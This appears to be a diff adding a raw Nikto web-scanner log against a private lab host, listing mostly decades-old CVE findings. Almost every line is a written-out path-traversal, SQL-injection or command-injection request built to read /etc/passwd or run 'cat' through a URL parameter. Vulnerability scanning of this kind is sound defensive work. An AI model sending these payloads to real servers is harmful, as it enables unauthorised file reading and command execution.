@@ -1,0 +1,198 @@
+- Nikto v2.5.0/
++ Target Host: 192.168.28.3
++ Target Port: 3500
++ GET /: Uncommon header 'x-request-id' found, with contents: cade869d-92af-470f-8b45-5d9853a79f69.
++ GET /: Uncommon header 'x-runtime' found, with contents: 0.002965.
++ GET /jx6kSi5i.fr: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/: 
++ HEAD WEBrick/1.3.1 appears to be outdated (current is at least 1.6.1).
++ OPTIONS OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
++ GET /readme.eml: Remote server may be infected with the Nimda virus.
++ GET /trace.axd: The .NET IIS server has application tracing enabled. This could allow an attacker to view the last 50 web requests.
++ GET /admin-serv/tasks/configuration/ViewLog?file=passwd&num=5000&str=&directories=admin-serv%2Flogs%2f..%2f..%2f..%2f..%2f..%2f..%2fetc&id=admin-serv: iPlanet Administration Server 5.1 allows remote users to download any file from the server. Upgrade to SunOne DS5.2 and in iDS5.1 SP2 Hotfix 2. See: CVE-2003-0676: 
++ GET /netget?sid=user&msg=300&file=../../../../../../../../../../etc/passwd: Sybex E-Trainer allows arbitrary files to be retrieved. See: CVE-2002-0262: 
++ GET ///etc/passwd: The server install allows reading of any system file by adding an extra '/' to the URL.
++ GET /albums/userpics/Copperminer.jpg.php?cat%20/etc/passwd: Coppermine 1.0 RC3 may have been compromised to allow arbitrary file retrieval. The product is no longer maintained and should be replaced.
++ GET /autohtml.php?op=modload&mainfile=x&name=/etc/passwd: php-proxima 6.0 and below allows arbitrary files to be retrieved. See: CVE-2003-0294: 
++ GET /atomicboard/index.php?location=../../../../../../../../../../etc/passwd: AtomicBoard v0.6.2 allows remote users to read arbitrary files. See: OSVDB-49354: 
++ GET /current/modules.php?mod=fm&file=../../../../../../../../../../etc/passwd%00&bn=fm_d1: w-agora 4.1.5 allows any file to be retrieved from the remote host. See: OSVDB-54099: 
++ GET /current/index.php?site=demos&bn=../../../../../../../../../../etc/passwd%00: w-agora 4.1.5 allows any file to be retrieved from the remote host. See: BID-6595,https://vulners.com/osvdb/OSVDB:3012: 
++ GET /typo3/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00: TYPO3 allows any file to be retrieved remotely. Upgrade to the latest version. See: https://seclists.org/bugtraq/2003/Feb/382: 
++ GET /cms/typo3/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00: TYPO3 allows any file to be retrieved remotely. Upgrade to the latest version. See: https://seclists.org/bugtraq/2003/Feb/382: 
++ GET /site/typo3/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00: TYPO3 allows any file to be retrieved remotely. Upgrade to the latest version. See: https://seclists.org/bugtraq/2003/Feb/382: 
++ GET /typo/typo3/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00: TYPO3 allows any file to be retrieved remotely. Upgrade to the latest version. See: https://seclists.org/bugtraq/2003/Feb/382: 
++ GET /typo3/typo3/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00: TYPO3 allows any file to be retrieved remotely. Upgrade to the latest version. See: https://seclists.org/bugtraq/2003/Feb/382: 
++ GET /ezhttpbench.php?AnalyseSite=/etc/passwd&NumLoops=1: eZ httpbench version 1.1 allows any file on the remote server to be retrieved. See: OSVDB-59600: 
++ GET /index.php?download=/etc/passwd: Snif 1.2.4 allows any file to be retrieved from the web server. See: https://vulners.com/osvdb/OSVDB:2870: 
++ GET /index.php?|=../../../../../../../../../etc/passwd: Portix-PHP Portal allows retrieval of arbitrary files via the '..' type filtering problem. See: OSVDB-59085: 
++ GET /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php).
++ GET /index.php?l=forum/view.php&topic=../../../../../../../../../etc/passwd: Portix-PHP Portal allows retrieval of arbitrary files via the '..' type filtering problem. See: OSVDB-59085: 
++ GET /jsp/jspsamp/jspexamples/viewsource.jsp?source=../../../../../../../../../../etc/passwd: Default JRun CGI lets users read any system file.
++ GET /k/home?dir=/&file=../../../../../../../../etc/passwd&lang=kor: Kebi Academy 2001 Web Solution allows any file to be retrieved from the remote system. See: OSVDB-51750: 
++ GET /nph-showlogs.pl?files=../../../../../../../../etc/passwd&filter=.*&submit=Go&linecnt=500&refresh=0: nCUBE Server Manage 1.0 allows any file to be read on the remote system.
++ GET /phpwebfilemgr/index.php?f=../../../../../../../../../etc/passwd: phpWebFileManager v2.0.0 and prior are vulnerable to a directory traversal bug. See: OSVDB-2829: 
++ GET /phptonuke.php?filnavn=/etc/passwd: Photonouke or myphpnuke allows arbitrary files to be retrieved from the remote host.
++ GET /put/cgi-bin/putport.exe?SWAP&BOM&OP=none&Lang=en-US&PutHtml=../../../../../../../../etc/passwd: NCR's Terradata server contains a CGI that allows any file to be retrieved remotely.
++ GET /ROADS/cgi-bin/search.pl?form=../../../../../../../../../../etc/passwd%00: The ROADS search.pl allows attackers to retrieve system files. See: CVE-2001-0215: 
++ GET /support/common.php?f=0&ForumLang=../../../../../../../../../../etc/passwd: This CGI allows attackers to read files on the host.
++ GET /viewpage.php?file=/etc/passwd: PHP-Nuke script viewpage.php allows any file to be retrieved from the remote system.
++ GET /Web_Store/web_store.cgi?page=../../../../../../../../../../etc/passwd%00.html: eXtropia's Web Store lets attackers read any file on the system by appending a %00.html to the name. See: CVE-2000-1005: 
++ GET /webMathematica/MSP?MSPStoreID=../../../../../../../../../../etc/passwd&MSPStoreType=image/gif: Wolfram Research's webMathematica allows any file to be read on the remote system. Upgrade to the latest version. See: CVE-2002-0926 http://www.wolfram.com: 
++ GET /servlet/webacc?User.html=../../../../../../../../../../../../../../../../../../etc/passwd%00: The Novell Groupwise WebAcc Servlet allows attackers to view arbitrary files on the server. See: CVE-2001-1458: 
++ GET /webcalendar/forum.php?user_inc=../../../../../../../../../../etc/passwd: Webcalendar 0.9.41 and below allow remote users to read arbitrary files.
++ GET /logbook.pl?file=../../../../../../../bin/cat%20/etc/passwd%00|: Wordit Limited 2000 allows command execution. See: https://vulners.com/osvdb/OSVDB:15392: 
++ GET /page.cgi?../../../../../../../../../../etc/passwd: WWWeBBB Forum up to version 3.82beta allow arbitrary file retrieval. See: OSVDB-59084: 
++ GET /edittag/edittag.cgi?file=%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd: EditTag allows arbitrary file retrieval. See: OSVDB-56290: 
++ GET /base/webmail/readmsg.php?mailbox=../../../../../../../../../../../../../../etc/passwd&id=1: Remote file retrieval. See: CVE-2001-1408: 
++ GET /athenareg.php?pass=%20;cat%20/etc/passwd: Athena web registration remote command execution. See: CVE-2004-1782: 
++ GET /PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd: This default Netscape file allows an attacker to read arbitrary files on the host. See: CVE-2000-1196: 
++ GET /search?NS-query-pat=../../../../../../../../../../etc/passwd: The iPlanet server allows arbitrary files to be retrieved through the search functionality. Install 4.1 SP10+ or 6.0 SP3+.
++ GET /................../etc/passwd: The web server allows the password file to be retrieved.
++ GET /site/'%20UNION%20ALL%20SELECT%20FileToClob('/etc/passwd','server')::html,0%20FROM%20sysusers%20WHERE%20username=USER%20--/.html: IBM Informix Web DataBlade allows remote execution of SQL.
++ GET /site/'%20UNION%20ALL%20SELECT%20FileToClob('/etc/passwd','server')::html,0%20FROM%20sysusers%20WHERE%20username%20=%20USER%20--/.html: Web DataBlade 4.12/Informix is vulnerable to SQL injection.
++ GET /basilix.php3?request_id[DUMMY]=../../../../etc/passwd&RequestID=DUMMY&username=sec&password=secu: Remote file retrieval. See: CVE-2001-1045: 
++ GET /index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc/&view=passwd: EW FileManager for PostNuke allows arbitrary file retrieval. See: CVE-2004-2047: 
++ GET /jsp/jspsamp/jspexamples/viewsource.jsp?source=/../../../../../../../../../etc/passwd: The JRUN view_source.jsp allows arbitrary file retrieval from the host. Upgrade to JRUN 2.3.3 or higher, or remove all default scripts. See: CVE-2000-0540: 
++ GET /.../.../.../.../.../.../.../.../.../.../etc/passwd: TelCondex SimpleWebserver 2.13.31027 and below allows directory traversal. See: OSVDB-2793: 
++ GET /readme: This might be interesting.
++ GET /etc/passwd: An '/etc/passwd' file is available via the web site.
++ GET /admbrowse.php?down=1&amp;cur=%2Fetc%2F&amp;dest=passwd&amp;rid=1&amp;S=[someid]: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum-ra.asp?n=....//....//....//....//....//....//....//etc.passwd: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum-ra.asp?n=../../../../../../../../../etc/passwd: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum-ra.asp?n=../../../../../../../../../etc/passwd%00: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum-ra.asp?n=/etc/passwd: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum-ra.asp?n=/etc/passwd%00: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum-ra_professionnel.asp?n=%60/etc/passwd%60: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum-ra_professionnel.asp?n=../../../../../../../../../etc/passwd%00: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum-ra_professionnel.asp?n=/../../../../../../etc/passwd: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum-ra_professionnel.asp?n=/../../../etc/passwd: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum-ra_professionnel.asp?n=/etc/passwd: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum-ra_professionnel.asp?n=/etc/passwd%00: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1.asp?n=%60/etc/passwd%60&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1.asp?n=....//....//....//....//....//....//....//etc.passwd&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1.asp?n=../../../../../../../../../etc/passwd%00&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1.asp?n=/../../../../../../etc/passwd&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1.asp?n=/../../../etc/passwd&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1.asp?n=/etc/passwd%00&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1.asp?n=/etc/passwd&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1.asp?n=1753&amp;nn=%60/etc/passwd%60: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1.asp?n=1753&amp;nn=....//....//....//....//....//....//....//etc.passwd: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1.asp?n=1753&amp;nn=../../../../../../../../../../etc/passwd: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1.asp?n=1753&amp;nn=../../../../../../../../../../etc/passwd%00: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1.asp?n=1753&amp;nn=/etc/passwd: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1.asp?n=1753&amp;nn=/etc/passwd%00: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1_professionnel.asp?n=%60/etc/passwd%60&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1_professionnel.asp?n=....//....//....//....//....//....//....//etc.passwd&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1_professionnel.asp?n=../../../../../../../../../etc/passwd%00&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1_professionnel.asp?n=/../../../../../../../../etc/passwd&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1_professionnel.asp?n=/etc/passwd%00&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1_professionnel.asp?n=/etc/passwd&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1_professionnel.asp?n=1771&amp;nn=%60/etc/passwd%60&amp;page=1: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1_professionnel.asp?n=1771&amp;nn=....//....//....//....//....//....//....//etc.passwd&amp;page=1: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1_professionnel.asp?n=1771&amp;nn=../../../../../../../../../etc/passwd%00&amp;page=1: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1_professionnel.asp?n=1771&amp;nn=/../../../../../../../../etc/passwd&amp;page=1: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1_professionnel.asp?n=1771&amp;nn=/etc/passwd%00&amp;page=1: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1_professionnel.asp?n=1771&amp;nn=/etc/passwd&amp;page=1: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=%60/etc/passwd%60: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=....//....//....//....//....//....//....//etc.passwd: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=../../../../../../../../../etc/passwd%00: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/../../../../../../../../../../etc/passwd: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/etc/passwd: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/etc/passwd%00: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /mailview.cgi?cmd=view&amp;fldrname=inbox&amp;select=1&amp;html=../../../../../../etc/passwd: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /modif_infos.asp?n=%60/etc/passwd%60: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /modif_infos.asp?n=....//....//....//....//....//....//....//etc.passwd: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /modif_infos.asp?n=../../../../../../../../../etc/passwd%00: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /modif_infos.asp?n=/../../../../../../../../../etc/passwd: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /modif_infos.asp?n=/etc/passwd: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /modif_infos.asp?n=/etc/passwd%00: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /setpasswd.cgi: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /shoutbox/expanded.php?conf=../../../../../../../etc/passwd%20: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /tmp_view.php?file=/etc/passwd: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /userreg.cgi?cmd=insert&amp;lang=eng&amp;tnum=3&amp;fld1=test999%0acat&lt;/var/spool/mail/login&gt;&gt;/etc/passwd: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /mylog.html?screen=/etc/passwd: Remote file read vulnerability 1999-0068. See: CVE-1999-0068: 
++ GET /mylog.phtml?screen=/etc/passwd: Remote file read vulnerability 1999-0068. See: CVE-1999-0068: 
++ GET /php/mylog.html?screen=/etc/passwd: Remote file read vulnerability 1999-0346. See: CVE-1999-0068: 
++ GET /php/mylog.phtml?screen=/etc/passwd: Remote file read vulnerability 1999-0346. See: CVE-1999-0068: 
++ GET /fi?/etc/passwd: Remote file read vulnerability 1999-0346. See: CVE-1999-0068: 
++ GET /directory.php?dir=%3Bcat%20/etc/passwd: Marcus S. Xenakis directory.php script allows for command execution. See: CVE-2002-0434: 
++ GET /content/base/build/explorer/none.php?..:..:..:..:..:..:..:etc:passwd:: SunPS iRunbook Version 2.5.2 allows files to be read remotely. See: CVE-2002-1034,CVE-2002-1033: 
++ GET /content/base/build/explorer/none.php?/etc/passwd: SunPS iRunbook Version 2.5.2 allows files to be read remotely. See: CVE-2002-1034,CVE-2002-1033: 
++ GET /bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK: PHP-Nuke is vulnerable to a remote file retrieval vuln. It should be upgraded to the latest version. See: CVE-2001-0320: 
++ GET /postnuke/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK: PHP-Nuke is vulnerable to a remote file retrieval vuln. It should be upgraded to the latest version. See: CVE-2001-0320: 
++ GET /postnuke/html/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK: PHP-Nuke is vulnerable to a remote file retrieval vuln. It should be upgraded to the latest version. See: CVE-2001-0320: 
++ GET /modules/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK: PHP-Nuke is vulnerable to a remote file retrieval vuln. It should be upgraded to the latest version. See: CVE-2001-0320: 
++ GET /phpBB/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK: PHP-Nuke is vulnerable to a remote file retrieval vuln. It should be upgraded to the latest version. See: CVE-2001-0320: 
++ GET /forum/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK: PHP-Nuke is vulnerable to a remote file retrieval vuln. It should be upgraded to the latest version. See: CVE-2001-0320: 
++ GET /shop/normal_html.cgi?file=../../../../../../etc/issue%00: Happymail E-Commerce 4.3/4.4 allows arbitrary files to be retrieved remotely. See: CVE-2003-0243: 
++ GET /shop/normal_html.cgi?file=;cat%20/etc/passwd|: Happymail E-Commerce 4.3/4.4 allows arbitrary commands to be executed remotely. See: CVE-2003-0243: 
++ GET /shop/normal_html.cgi?file=|cat%20/etc/passwd|: Happymail E-Commerce 4.3/4.4 allows arbitrary commands to be executed remotely. See: CVE-2003-0243: 
++ GET /shop/member_html.cgi?file=;cat%20/etc/passwd|: Happymail E-Commerce 4.3/4.4 allows arbitrary commands to be executed remotely. See: CVE-2003-0243: 
++ GET /shop/member_html.cgi?file=|cat%20/etc/passwd|: Happymail E-Commerce 4.3/4.4 allows arbitrary commands to be executed remotely. See: CVE-2003-0243: 
++ GET /3rdparty/phpMyAdmin/export.php?what=../../../../../../../../../../../../etc/passwd%00: phpMyAdmin is vulnerable to a directory traversal attack. See: CVE-2004-0129: 
++ GET /phpMyAdmin/export.php?what=../../../../../../../../../../../../etc/passwd%00: phpMyAdmin is vulnerable to a directory traversal attack. See: CVE-2004-0129: 
++ GET /3rdparty/phpmyadmin/export.php?what=../../../../../../../../../../../../etc/passwd%00: phpMyAdmin is vulnerable to a directory traversal attack. See: CVE-2004-0129: 
++ GET /phpmyadmin/export.php?what=../../../../../../../../../../../../etc/passwd%00: phpMyAdmin is vulnerable to a directory traversal attack. See: CVE-2004-0129: 
++ GET /pma/export.php?what=../../../../../../../../../../../../etc/passwd%00: phpMyAdmin is vulnerable to a directory traversal attack. See: CVE-2004-0129: 
++ GET /.tools/phpMyAdmin/current/export.php?what=../../../../../../../../../../../../etc/passwd%00: phpMyAdmin is vulnerable to a directory traversal attack. See: CVE-2004-0129: 
++ GET /~nobody/etc/passwd: Apache is misconfigured to view files by accessing ~nobody/filename. Change UserDir from './' to something else in httpd.conf. See: http://httpd.apache.org/docs/2.4/mod/mod_userdir.html: 
++ GET /dcforum/dcforum.cgi?az=list&forum=../../../../../../../../../../etc/passwd%00: This install of DCForum allows attackers to read arbitrary files on the host. See: CVE-2001-0437: 
++ GET /viewimg.php?path=../../../../../../../../../../etc/passwd&form=1&var=1: KorWebLog allows any file to be read on the system. See: https://seclists.org/fulldisclosure/2004/Nov/1116: 
++ GET /shoutbox.php?conf=../../../../../../../etc/passwd: Webfroot Shoutbox 2.32 and below allows any file to be read from the system. See: OSVDB-4775: 
++ GET /admin/system.php3?cmd=cat%20/etc/passwd: DotBr 0.1 allows remote command execution. See: OSVDB-5089: 
++ GET /admin/exec.php3?cmd=cat%20/etc/passwd: DotBr 0.1 allows remote command execution. See: OSVDB-5090: 
++ GET /bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK: PHP-Nuke is vulnerable to a remote file retrieval vuln. It should be upgraded to the latest version. CVE-2001-0320. See: CVE-2001-0320,CVE-2001-0001: 
++ GET /postnuke/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK: PHP-Nuke is vulnerable to a remote file retrieval vuln. It should be upgraded to the latest version. CVE-2001-0320. See: CVE-2001-0320,CVE-2001-0001: 
++ GET /postnuke/html/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK: PHP-Nuke is vulnerable to a remote file retrieval vuln. It should be upgraded to the latest version. CVE-2001-0320. See: CVE-2001-0320,CVE-2001-0001: 
++ GET /modules/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK: PHP-Nuke is vulnerable to a remote file retrieval vuln. It should be upgraded to the latest version. CVE-2001-0320. See: CVE-2001-0320,CVE-2001-0001: 
++ GET /phpBB/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK: PHP-Nuke is vulnerable to a remote file retrieval vuln. It should be upgraded to the latest version. CVE-2001-0320. See: CVE-2001-0320,CVE-2001-0001: 
++ GET /forum/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK: PHP-Nuke is vulnerable to a remote file retrieval vuln. It should be upgraded to the latest version. CVE-2001-0320. See: CVE-2001-0320,CVE-2001-0001: 
++ GET /opendir.php?/etc/passwd: This PHP-Nuke CGI allows attackers to read any file on the web server. See: CVE-2001-0321: 
++ GET /opendir.php?requesturl=/etc/passwd: This PHP-Nuke CGI allows attackers to read any file on the web server. See: CVE-2001-0321: 
++ GET /gallery/index.php?include=../../../../../../../../../etc/passwd: Gallery allows files to be read remotely. See: CVE-2001-0900: 
++ GET /modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../../../../etc/passwd: Gallery Addon for PHP-Nuke allows files to be read remotely. See: CVE-2001-0900: 
++ GET /phprocketaddin/?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. See: CVE-2001-1204: 
++ GET /wp-app.log: Wordpress' wp-app.log may leak application/system details.
++ GET /wordpress/wp-app.log: Wordpress' wp-app.log may leak application/system details.
++ GET /services/Version?xsd=../../../../../../../../../../../etc/passwd: Apache Axis2 contains a directory traversal in the Version program. See: https://issues.apache.org/jira/browse/AXIS2-4279,https://www.exploit-db.com/exploits/12721: 
++ GET /axis/services/Version?xsd=../../../../../../../../../../../etc/passwd: Apache Axis2 contains a directory traversal in the Version program. See: https://issues.apache.org/jira/browse/AXIS2-4279,https://www.exploit-db.com/exploits/12721: 
++ GET /axis2/services/Version?xsd=../../../../../../../../../../../etc/passwd: Apache Axis2 contains a directory traversal in the Version program. See: https://issues.apache.org/jira/browse/AXIS2-4279,https://www.exploit-db.com/exploits/12721: 
++ GET /imcws/services/Version?xsd=../../../../../../../../../../../etc/passwd: Apache Axis2 contains a directory traversal in the Version program. See: https://issues.apache.org/jira/browse/AXIS2-4279,https://www.exploit-db.com/exploits/12721: 
++ GET /WebServiceImpl/services/Version?xsd=../../../../../../../../../../../etc/passwd: Apache Axis2 contains a directory traversal in the Version program. See: https://issues.apache.org/jira/browse/AXIS2-4279,https://www.exploit-db.com/exploits/12721: 
++ GET /dswsbobje/services/Version?xsd=../../../../../../../../../../../etc/passwd: Apache Axis2 contains a directory traversal in the Version program. See: https://issues.apache.org/jira/browse/AXIS2-4279,https://www.exploit-db.com/exploits/12721: 
++ GET /ws/services/Version?xsd=../../../../../../../../../../../etc/passwd: Apache Axis2 contains a directory traversal in the Version program. See: https://issues.apache.org/jira/browse/AXIS2-4279,https://www.exploit-db.com/exploits/12721: 
++ GET /Trace.axd: Trace.axd can reveal application or system details.
++ GET /horde/util/barcode.php?type=../../../../../../../../../../../etc/./passwd%00: Horde local file retrieval (LFI) found. See: CVE-2009-0932: 
++ GET /_profiler/: Symfony Profiler may reveal sensitive application information.
++ GET /flex2gateway/: Adobe BlazeDS is vulnerable to an XXE. See: CVE-2009-3960: 
++ GET /flex2gateway/http: Adobe BlazeDS is vulnerable to an XXE. See: CVE-2009-3960: 
++ GET /flex2gateway/httpsecure: Adobe BlazeDS is vulnerable to an XXE. See: CVE-2009-3960: 
++ GET /flex2gateway/cfamfpoolling: Adobe BlazeDS is vulnerable to an XXE. See: CVE-2009-3960: 
++ GET /flex2gateway/amf: Adobe BlazeDS is vulnerable to an XXE. See: CVE-2009-3960: 
++ GET /flex2gateway/amfpolling: Adobe BlazeDS is vulnerable to an XXE. See: CVE-2009-3960: 
++ GET /messagebroker/http: Adobe BlazeDS is vulnerable to an XXE. See: CVE-2009-3960: 
++ GET /messagebroker/httpsecure: Adobe BlazeDS is vulnerable to an XXE. See: CVE-2009-3960: 
++ GET /blazeds/messagebroker/http: Adobe BlazeDS is vulnerable to an XXE. See: CVE-2009-3960: 
++ GET /blazeds/messagebroker/httpsecure: Adobe BlazeDS is vulnerable to an XXE. See: CVE-2009-3960: 
++ GET /samples/messagebroker/http: Adobe BlazeDS is vulnerable to an XXE. See: CVE-2009-3960: 
++ GET /samples/messagebroker/httpsecure: Adobe BlazeDS is vulnerable to an XXE. See: CVE-2009-3960: 
++ GET /lcds/messagebroker/http: Adobe BlazeDS is vulnerable to an XXE. See: CVE-2009-3960: 
++ GET /lcds/messagebroker/httpsecure: Adobe BlazeDS is vulnerable to an XXE. See: CVE-2009-3960: 
++ GET /lcds-samples/messagebroker/http: Adobe BlazeDS is vulnerable to an XXE. See: CVE-2009-3960: 
++ GET /lcds-samples/messagebroker/httpsecure: Adobe BlazeDS is vulnerable to an XXE. See: CVE-2009-3960: 
++ GET /rails/info/properties/: The Ruby on Rails status page may reveal the version of RoR and further details on this host.
++ GET /rails/info/routes/: The Ruby on Rails routes page may reveal all available routes on this host.
++ GET /web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility: MAGMI allows any file to be retrieved remotely. See: CVE-2015-2067: 
++ GET /magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility: MAGMI allows any file to be retrieved remotely. See: CVE-2015-2067: 
++ GET /magmi-importer/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility: MAGMI allows any file to be retrieved remotely. See: CVE-2015-2067: 
++ GET /magento/magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility: MAGMI allows any file to be retrieved remotely. See: CVE-2015-2067: 
++ GET /magento/magmi-importer/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility: MAGMI allows any file to be retrieved remotely. See: CVE-2015-2067: 
